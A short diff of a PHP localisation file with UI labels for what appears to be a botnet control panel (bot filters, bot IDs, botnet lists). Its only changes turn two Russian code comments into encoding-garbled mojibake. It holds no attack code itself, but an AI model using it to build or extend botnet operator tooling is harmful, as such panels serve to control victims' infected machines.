@@ -3,7 +3,7 @@ define('LNG_BOTNET', 'Bots');
 
 define('LNG_BOTNET_BOTSACTION', 'Bots action:');
 
-//Фильтр.
+//Р В¤Р С‘Р В»РЎРЉРЎвЂљРЎР‚.
 define('LNG_BOTNET_FILTER_TITLE',          'Filter');
 
 define('LNG_BOTNET_FILTER_BOTS',           'Bots:');
@@ -31,7 +31,7 @@ define('LNG_BOTNET_FILTER_COMMENT_FALSE',  'Not exists');
 define('LNG_BOTNET_FILTER_RESET',          'Reset form');
 define('LNG_BOTNET_FILTER_SUBMIT',         'Accept');
 
-//Список.
+//Р РЋР С—Р С‘РЎРѓР С•Р С”.
 define('LNG_BOTNET_LIST',            'Result (%s):');
 define('LNG_BOTNET_LIST_BOTID',      'Bot ID');
 define('LNG_BOTNET_LIST_BOTNET',     'Botnet');
